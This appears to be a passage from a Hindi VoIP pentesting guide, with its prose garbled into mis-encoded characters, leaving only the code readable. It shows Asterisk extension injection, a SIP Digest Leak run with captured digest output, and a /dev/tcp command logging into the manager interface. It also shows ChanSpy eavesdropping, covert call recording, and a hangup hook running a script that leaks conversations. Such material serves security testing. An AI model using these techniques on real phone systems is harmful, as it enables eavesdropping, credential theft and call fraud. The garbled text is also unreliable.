рдХрд╛рд░реНрдпреЛрдВ рдХреА рд░реЗрдВрдЬ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

VoIP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ IVRS рдЖрдо рддреМрд░ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗ рдорд┐рд▓рддрд╛ рд╣реИ:

1. **рд╡реЙрдпрд╕ рдкреНрд░реЙрдореНрдкреНрдЯреНрд╕**: рдкреВрд░реНрд╡-рд░рд┐рдХреЙрд░реНрдбреЗрдб рдСрдбрд┐рдпреЛ рд╕рдВрджреЗрд╢ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ IVR рдореЗрдиреВ рд╡рд┐рдХрд▓реНрдк рдФрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧрд╛рдЗрдб рдХрд░рддреЗ рд╣реИрдВред
2. **DTMF** (рдбреНрдпреВрд▓-рдЯреЛрди рдорд▓реНрдЯреА-рдлрд╝реНрд░реАрдХреНрд╡реЗрдВрд╕реА) рд╕рд┐рдЧреНрдирд▓рд┐рдВрдЧ: рдлреЛрди рдкрд░ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рджрдмрд╛рдХрд░ рдЙрддреНрдкрдиреНрди рдЯрдЪ-рдЯреЛрди рдЗрдирдкреБрдЯ рдЬреЛ IVR рдореЗрдиреВ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрдирдкреБрдЯ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
3. **рдХреЙрд▓ рд░реВрдЯрд┐рдВрдЧ**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рднрд╛рдЧреЛрдВ, рдПрдЬреЗрдВрдЯреНрд╕, рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдЬреИрд╕реЗ рдЙрдЪрд┐рдд рдЧрдВрддрд╡реНрдпреЛрдВ рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ред
4. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреИрдкреНрдЪрд░**: рдХреЙрд▓рд░реНрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рдЦрд╛рддрд╛ рд╕рдВрдЦреНрдпрд╛рдПрдБ, рдорд╛рдорд▓рд╛ рдЖрдИрдбреА, рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдПрдХрддреНрд░ рдХрд░рдирд╛ред
5. **рдмрд╛рд╣рд░реА рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХрд░рдг**: IVR рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдпрд╛ рдЕрдиреНрдп рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рдЬрд┐рд╕рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдПрдХреНрд╕реЗрд╕ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ, рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ, рдпрд╛ рдШрдЯрдирд╛рдПрдБ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдПрдХ рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ VoIP рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ, рдЖрдк `extensions.conf` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ `Background()`, `Playback()`, `Read()`, рдФрд░ рдЕрдиреНрдп рдЬреИрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ IVR рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЖрдкрдХреЛ рд╡реЙрдпрд╕ рдкреНрд░реЙрдореНрдкреНрдЯреНрд╕ рдкреНрд▓реЗ рдХрд░рдиреЗ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ, рдФрд░ рдХреЙрд▓ рдлрд╝реНрд▓реЛ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред

#### рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
рдкрд┐рдЫрд▓рд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **1 рджрдмрд╛рдПрдВ** рдПрдХ рд╡рд┐рднрд╛рдЧ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **2 рджрдмрд╛рдПрдВ** рджреВрд╕рд░реЗ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╛ **рдкреВрд░рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдЕрдЧрд░ рдЙрд╕реЗ рдкрддрд╛ рд╣реИред\
рд╕рдВрдХрдЯрд╢реАрд▓рддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрдВрдбрд┐рдХреЗрдЯреЗрдб **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд▓рдВрдмрд╛рдИ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ 5 рд╕реЗрдХрдВрдб рдХреА рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреЗ рдмрд╛рдж рдПрдХ рдкреВрд░рд╛ рдирдВрдмрд░ рдЗрдирдкреБрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡рд╣ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**

### рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЗрдВрдЬреЗрдХреНрд╢рди

рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
рдЬрд╣рд╛рдБ **`${EXTEN}`** **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рд╣реИ рдЬреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрдм **рдПрдХреНрд╕рдЯреЗрдВрд╢рди 101 рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛** рддреЛ рдпрд╣ рд╣реЛрдЧрд╛:
```scss
exten => 101,1,Dial(SIP/101)
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ **`${EXTEN}`** рдХреЛ **рдирдВрдмрд░ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рднреА** рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ (рдкреБрд░рд╛рдиреЗ Asterisk рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ), рддреЛ рд╣рдорд▓рд╛рд╡рд╛рд░ **`101&SIP123123123`** рджрд░реНрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдлреЛрди рдирдВрдмрд░ 123123123 рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдФрд░ рдпрд╣реА рдкрд░рд┐рдгрд╛рдо рд╣реЛрдЧрд╛:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
рдЗрд╕рд▓рд┐рдП, **`101`** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдФрд░ **`123123123`** рдкрд░ рдХреЙрд▓ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдФрд░ рдХреЙрд▓ рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ рд╣реА рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛... рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ **рдХрд┐рд╕реА рдРрд╕реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдорд┐рд▓рд╛рди рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджреЗрддрд╛ рд╣реИ** рдЬреЛ рдХрд┐ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рддреЛ рд╡рд╣ **рдХреЗрд╡рд▓ рдЪрд╛рд╣реЗ рдЧрдП рдирдВрдмрд░ рдкрд░ рдХреЙрд▓ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## SIPDigestLeak рднрдпрд╛рд╡рд╣рддрд╛

SIP Digest Leak рдПрдХ рднрдпрд╛рд╡рд╣рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ SIP рдлреЛрдиреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдФрд░ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЖрдИрдкреА рдлреЛрдиреНрд╕ рд╕рд╣рд┐рдд рдлреЛрди рдПрдбрд╛рдкреНрдЯрд░реНрд╕ (VoIP рд╕реЗ рдПрдирд╛рд▓реЙрдЧ рдореЗрдВ) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпрд╣ рднрдпрд╛рд╡рд╣рддрд╛ **Digest рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд▓реАрдХ** рд╕рдВрднрд╡ рдмрдирд╛рддреА рд╣реИ, рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдПрдХ **рдСрдлрд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рд╣рдорд▓рд╛ рдлрд┐рд░ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЪреИрд▓реЗрдВрдЬ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рдкрд╛рд╕рд╡рд░реНрдб рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**[рдпрд╣рд╛рдВ рд╕реЗ рднрдпрд╛рд╡рд╣рддрд╛ рдХреЗ рд╕реНрдерд┐рддрд┐**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. рдПрдХ рдЖрдИрдкреА рдлреЛрди (рд╢рд┐рдХрд╛рд░реА) рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрди рд░рд╣рд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: 5060), рдлреЛрди рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ
2. рд╣рдорд▓рд╛рд╡рд░ рдПрдХ INVITE рдЖрдИрдкреА рдлреЛрди рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ
3. рд╢рд┐рдХрд╛рд░реА рдлреЛрди рдмрдЬрдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЛрдИ рдЙрддреНрддрд░ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рддреЛ рдХреЛрдИ рдлреЛрди рдЙрд╕ рдУрд░ рд╕реЗ рдЙрддреНрддрд░ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ
4. рдЬрдм рдлреЛрди рдХреЛ рд░рдЦ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╢рд┐рдХрд╛рд░реА рдлреЛрди рдПрдХ BYE рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ**
5. **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ 407 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ** рдЬреЛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдорд╛рдВрдЧ рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреИрд▓реЗрдВрдЬ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ
6. **рд╢рд┐рдХрд╛рд░реА рдлреЛрди рдПрдХ рджреВрд╕рд░реЗ BYE рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреИрд▓реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**
7. **рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдЕрдкрдиреА рд╕реНрдерд╛рдиреАрдп рдорд╢реАрди рдкрд░ (рдпрд╛ рд╡рд┐рддрд░рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдЖрджрд┐) рдЪреИрд▓реЗрдВрдЬ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ

* **SIPPTS рд▓реАрдХ** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS рд▓реАрдХ рдПрдХ рднрдпрд╛рд╡рд╣рддрд╛ рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ SIP рдлреЛрдиреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЖрдЙрдЯрдкреБрдЯ рдХреЛ SipCrack рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ SIPPTS dcrack рдпрд╛ SipCrack рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### рдХреНрд▓рд┐рдХ2рдХреЙрд▓

рдХреНрд▓рд┐рдХ2рдХреЙрд▓ рдПрдХ **рд╡реЗрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдЕрдкрдирд╛ **рдЯреЗрд▓реАрдлреЛрди рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдЙрддреНрдкрд╛рдж рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦ рд╕рдХрддрд╛ рд╣реИ)ред рдлрд┐рд░ рдПрдХ рд╡реНрдпрд╛рдкрд╛рд░рд┐рдХ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдЬрдм рд╡рд╣ **рдлреЛрди рдЙрдард╛рддрд╛ рд╣реИ** рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдПрдЬреЗрдВрдЯ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп Asterisk рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╣реИ:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* рдкрд┐рдЫрд▓рд╛ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ **рдХрд┐рд╕реА рднреА рдЖрдИрдкреА рдкрддреЗ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд░рд╣рд╛ рд╣реИ** (рдЕрдЧрд░ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реИ)ред
* **рдХреЙрд▓ рд╕рдВрдЧрдард┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП, рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, **рдХреЛрдИ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ** рдФрд░ **рдХреЗрд╡рд▓** **рдЙрддреНрдкрдиреНрди** рдореЗрдВ **рд▓рд┐рдЦрдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЛрдИ рднреА рдЖрдИрдкреА рдкрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирдиреЗ рд╡рд╛рд▓рд╛ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдорд╛рдВрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред**

### **рдИрд╡реНрд╕рдбреНрд░реЙрдкрд┐рдВрдЧ**

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ **`ChanSpy`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП** **рдПрдХреНрд╕рдЯреЗрдВрд╢рди(рдПрд╕) рдХреЛ рдореЙрдирд┐рдЯрд░** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ (рдпрд╛ рд╕рднреА рдХреЛ) рдЬрд┐рдирдореЗрдВ рдмрд╛рддрдЪреАрдд рд╣реЛ рд░рд╣реА рд╣реИред рдЗрд╕ рдХрдорд╛рдВрдб рдХреЛ рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рд╕реМрдВрдкрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **`exten => 333,1,ChanSpy('all',qb)`** рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдк **рдПрдХреНрд╕рдЯреЗрдВрд╢рди 333** рдХреЛ **рдХреЙрд▓** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **`all`** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ **рдореЙрдирд┐рдЯрд░** рдХрд░реЗрдЧрд╛, **рдирдИ рдмрд╛рддрдЪреАрдд рд╢реБрд░реВ рд╣реЛрдиреЗ рдкрд░ рд╕реБрдирдирд╛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛** (**`b`**) рдЪреБрдкреНрдк рдореЛрдб рдореЗрдВ (**`q`**) рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдЗрд╕рдореЗрдВ рд╡реНрдпрд╛рдкрдХрддрд╛ рдХрд░рдиреА рдирд╣реАрдВ рд╣реИред рдЖрдк рдПрдХ рд╕реЗ рджреВрд╕рд░реА рдмрд╛рддрдЪреАрдд рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ **`*`** рджрдмрд╛рдХрд░, рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирдВрдмрд░ рдХреЛ рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рдХреЗред

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдмрд╛рддрдЪреАрддреЛрдВ рдХреЛ рд╕реБрдирдиреЗ рдХреА рдмрдЬрд╛рдп, рдЙрдиреНрд╣реЗрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рд░рд┐рдХреЙрд░реНрдб рдХрд░рдирд╛** рднреА рд╕рдВрднрд╡ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

рдХреЙрд▓ **`/tmp`** рдореЗрдВ рд╕реЗрд╡ рд╣реЛ рдЬрд╛рдПрдЧреАред

рдЖрдк рдпрд╣рд╛рдБ рддрдХ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ **рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗ рдЬреЛ рдХреЙрд▓ рдХреЛ рд▓реАрдХ рдХрд░реЗрдЧрд╛** рдЬрдм рдпрд╣ рдмрдВрдж рд╣реЛ рдЬрд╛рдПред
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖

**RTCPBleed** рдПрдХ рдкреНрд░рдореБрдЦ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ рдЬреЛ Asterisk рдЖрдзрд╛рд░рд┐рдд VoIP рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ (2017 рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХреА рдЧрдИред) рдпрд╣ рджреЛрд╖ **RTP (рд░рд┐рдпрд▓ рдЯрд╛рдЗрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рдЯреНрд░реИрдлрд┐рдХ** рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХрд┐рд╕реА рднреА рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рд╡реЙрдпрдкреА рдХрдиреНрд╡рд░реНрд╕реЗрд╢рди рдХреЛ рд▓реЗрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ RTP рдЯреНрд░реИрдлрд┐рдХ NAT (рдиреЗрдЯрд╡рд░реНрдХ рдкрддрд╛ рдЕрдиреБрд╡рд╛рджрди) рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддреЗ рд╕рдордп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред

RTP рдкреНрд░реЙрдХреНрд╕реА рдЖрд░рдЯреАрд╕реА рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА **NAT рд╕реАрдорд╛рдПрдВ** рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП RTP рд╕реНрдЯреНрд░реАрдо рдХреЛ рджреЛ рдпрд╛ рджреЛ рд╕реЗ рдЕрдзрд┐рдХ рдкрдХреНрд╖реЛрдВ рдХреЗ рдмреАрдЪ рдкреНрд░реЙрдХреНрд╕реА рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм NAT рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ RTP рдкреНрд░реЙрдХреНрд╕реА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЕрдХреНрд╕рд░ рд╕рд╛рдЗрдирд▓рд┐рдВрдЧ (рдЬреИрд╕реЗ SIP) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ RTP IP рдФрд░ рдкреЛрд░реНрдЯ рдЬрд╛рдирдХрд╛рд░реА рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред 